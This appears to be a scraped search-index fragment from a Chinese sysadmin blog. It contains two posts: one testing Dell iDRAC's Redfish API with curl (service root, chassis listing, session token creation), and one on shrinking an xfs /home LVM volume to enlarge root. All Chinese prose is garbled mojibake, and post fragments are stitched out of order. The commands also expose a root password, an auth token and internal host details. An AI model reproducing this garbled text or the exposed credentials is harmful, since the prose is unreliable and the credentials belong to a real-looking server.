æ³¨æ„Dellå®˜æ–¹çš„æ–‡æ¡£é‡Œå±…ç„¶ä¸æjsonçš„äº‹ï¼Œç›´æ¥ç”¨å®ƒç»™çš„å‘½ä»¤ä¼šæŠ¥é”™çš„ï¼Œpostçš„æ•°æ®æ˜æ˜¾æ˜¯ä¸ªjsonã€‚\nç»“æœï¼š * About to connect() to 10.16.24.15 port 443 (#0) * Trying 10.16.24.15... connected * Connected to 10.16.24.15 (10.16.24.15) port 443 (#0) * Initializing NSS with certpath: sql:/etc/pki/nssdb * warning: ignoring value of ssl.verifyhost * skipping SSL peer certificate verification * SSL connection using TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 * Server certificate: * subject: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US * start date: Mar 15 06:13:00 2018 GMT * expire date: Mar 15 06:14:22 2028 GMT * common name: idrac-7Q9N8P2 * issuer: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US \u0026gt; POST /redfish/v1/Sessions HTTP/1.1 \u0026gt; User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2 \u0026gt; Host: 10.16.24.15 \u0026gt; Accept: */* \u0026gt; Content-Type: application/json \u0026gt; Content-Length: 39 \u0026gt; } [data not shown] \u0026lt; HTTP/1.1 201 Created \u0026lt; OData-Version: 4.0 \u0026lt; Keep-Alive: timeout=60, max=199 \u0026lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8 \u0026lt; Server: iDRAC/8 \u0026lt; Location: /redfish/v1/Sessions/13 \u0026lt; Date: Wed, 05 Sep 2018 08:26:55 GMT \u0026lt; X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f \u0026lt; Cache-Control: no-cache \u0026lt; Content-Length: 745 \u0026lt; Connection: Keep-Alive \u0026lt; Access-Control-Allow-Origin: * \u0026lt; Accept-Ranges: bytes \u0026lt; { [data not shown] * Connection #0 to host 10.16.24.15 left intact * Closing connection #0 { \u0026#34;@Message.ExtendedInfo\u0026#34;: [ { \u0026#34;Message\u0026#34;: \u0026#34;The resource has been created successfully\u0026#34;, \u0026#34;MessageArgs\u0026#34;: [], \u0026#34;MessageArgs@odata.count\u0026#34;: 0, \u0026#34;MessageId\u0026#34;: \u0026#34;Base.1.0.Created\u0026#34;, \u0026#34;RelatedProperties\u0026#34;: [], \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, \u0026#34;Resolution\u0026#34;: \u0026#34;None\u0026#34;, \u0026#34;Severity\u0026#34;: \u0026#34;OK\u0026#34; }, { \u0026#34;Message\u0026#34;: \u0026#34;A new resource is successfully created.\u0026#34;, \u0026#34;MessageArgs\u0026#34;: [], \u0026#34;MessageArgs@odata.count\u0026#34;: 0, \u0026#34;MessageId\u0026#34;: \u0026#34;IDRAC.1.6.SYS414\u0026#34;, \u0026#34;RelatedProperties\u0026#34;: [], \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, \u0026#34;Resolution\u0026#34;: \u0026#34;No response action is required.\u0026#34;, \u0026#34;Severity\u0026#34;: \u0026#34;Informational\u0026#34; } ], \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#Session.Session\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions/13\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#Session.v1_0_2.Session\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;User Session\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;User Session\u0026#34;, \u0026#34;Password\u0026#34;: null, \u0026#34;UserName\u0026#34;: \u0026#34;root\u0026#34; } è®°ä¸‹è¿™è¡Œï¼šX-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\nè¯•è¯•è¿™ç§Sessionçš„åŠŸæ•ˆ\ncurl -k https://10.16.24.15/redfish/v1/Chassis -s --header \u0026#34;X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\u0026#34; | jq . ç»“æœï¼š { \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, \u0026#34;Members\u0026#34;: [ { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; }, { \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; } ], \u0026#34;Members@odata.count\u0026#34;: 2, \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; } æå®šï¼Œå¦‚æœè¿˜æƒ³éœ€è¦æ›´å¤šçš„åŠŸèƒ½ï¼Œå°±å»çœ‹æ‰‹å†Œå§ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-dell_redfish/","summary":"\u003cp\u003eå„å¤§ä¸»æ¿å‚å•†çº·çº·æ”¯æŒä¸‹ä¸€ä»£å¸¦å¤–ç®¡ç†æ ‡å‡†redfishã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®Dellçš„idracç®¡ç†åšçš„æ˜¯ç›¸å½“å¥½çš„ï¼Œé‚£ä¹ˆæ¥çœ‹çœ‹å¯¹redfishçš„æ”¯æŒå§ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆçœ‹çœ‹v1éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -s  \u003cspan class=\"s2\"\u003e\u0026#34;https://10.16.24.15/redfish/v1\u0026#34;\u003c/span\u003e -k -u root:xxxxxxxx \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç»“æœå¦‚ä¸‹ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.context\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$metadata\u003c/span\u003e\u003cspan class=\"s2\"\u003e#ServiceRoot.ServiceRoot\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#ServiceRoot.v1_1_0.ServiceRoot\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;AccountService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Chassis\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Description\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Root Service\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;EventService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/EventService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;RootService\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;JsonSchemas\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/JSONSchemas\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Links\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Sessions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Sessions\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Managers\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Managers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Root Service\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Oem\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Dell\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#DellServiceRoot.v1_0_0.ServiceRootSummary\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;IsBranded\u0026#34;\u003c/span\u003e: 0,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;ManagerMACAddress\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;50:9A:4C:82:B9:3F\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;ServiceTag\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;7Q9N8P2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;RedfishVersion\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1.0.2\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Registries\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Registries\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;SessionService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/SessionService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Systems\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Systems\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Tasks\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/TaskService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;UpdateService\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/UpdateService\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¥½å¤šæœåŠ¡æ’’ï¼ŒæŒ‘å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯çœ‹çœ‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -s  \u003cspan class=\"s2\"\u003e\u0026#34;https://10.16.24.15/redfish/v1/Chassis\u0026#34;\u003c/span\u003e -k -u root:alibaba \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç»“æœå¦‚ä¸‹ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.context\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$metadata\u003c/span\u003e\u003cspan class=\"s2\"\u003e#ChassisCollection.ChassisCollection\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;@odata.type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;#ChassisCollection.ChassisCollection\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Description\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Collection of Chassis\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Members\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;@odata.id\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Members@odata.count\u0026#34;\u003c/span\u003e: 2,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Chassis Collection\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†è¯•è¯•Sessionçš„ç®¡ç†ï¼š\u003c/p\u003e","title":"Dellçš„idrac redfishåˆæ¢"},{"content":"ç³»ç»Ÿæ˜¯xfsæ–‡ä»¶æ ¼å¼ã€‚/rootç©ºé—´ä¸å¤Ÿäº†ã€‚å¿…é¡»å¯¹ç©ºé—´è¿›è¡Œè°ƒæ•´ï¼Œæ‚²å‰§çš„æ˜¯xfsåªèƒ½å¢åŠ ç©ºé—´ï¼Œä¸èƒ½ç¼©å‡ç©ºé—´ï¼Œå¿…é¡»æ›²çº¿æ•‘å›½äº†ã€‚\næŸ¥çœ‹ä¸€ä¸‹ï¼Œç¼ºçœæœ‰ä¸¤ä¸ªlvmçš„åˆ†åŒº\n/dev/mapper/centos-root 40G /dev/mapper/centos-home 20G åªèƒ½å‡å°homeåˆ†åŒºï¼Œå†å¢å¤§rootåˆ†åŒºäº†ã€‚\nå…ˆå¤‡ä»½homeåˆ†åŒºï¼Œå¹¶ç¼©å°åˆ°2Gï¼š\n# yum -y install xfsdump # xfsdump -f /home.xfsdump /home please enter label for this dump session (timeout in 300 sec) -\u0026gt; home please enter label for media in drive 0 (timeout in 300 sec) -\u0026gt; home # umount /home # lvreduce -L 2G /dev/mapper/centos-home Do you really want to reduce home? [y/n]: y ç„¶åæ‰©å……rootåˆ†åŒºï¼š\n# lvextend -L +18G /dev/mapper/centos-root # xfs_growfs /dev/mapper/centos-root æœ€åæ¢å¤homeåˆ†åŒº\n# mkfs.xfs -f /dev/mapper/centos-home # mount /home # xfsrestore -f /home.xfsdump /home æå®š\n","permalink":"https://rendoumi.com/posts/20240124-lvm_resize/","summary":"\u003cp\u003eç³»ç»Ÿæ˜¯xfsæ–‡ä»¶æ ¼å¼ã€‚/rootç©ºé—´ä¸å¤Ÿäº†ã€‚å¿…é¡»å¯¹ç©ºé—´è¿›è¡Œè°ƒæ•´ï¼Œæ‚²å‰§çš„æ˜¯xfsåªèƒ½å¢åŠ ç©ºé—´ï¼Œä¸èƒ½ç¼©å‡ç©ºé—´ï¼Œå¿…é¡»æ›²çº¿æ•‘å›½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹ä¸€ä¸‹ï¼Œç¼ºçœæœ‰ä¸¤ä¸ªlvmçš„åˆ†åŒº\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/centos-root 40G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/centos-home 20G\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåªèƒ½å‡å°homeåˆ†åŒºï¼Œå†å¢å¤§rootåˆ†åŒºäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆå¤‡ä»½homeåˆ†åŒºï¼Œå¹¶ç¼©å°åˆ°2Gï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum -y install xfsdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfsdump -f /home.xfsdump /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplease enter label \u003cspan class=\"k\"\u003efor\u003c/span\u003e this dump session \u003cspan class=\"o\"\u003e(\u003c/span\u003etimeout in \u003cspan class=\"m\"\u003e300\u003c/span\u003e sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-\u0026gt; 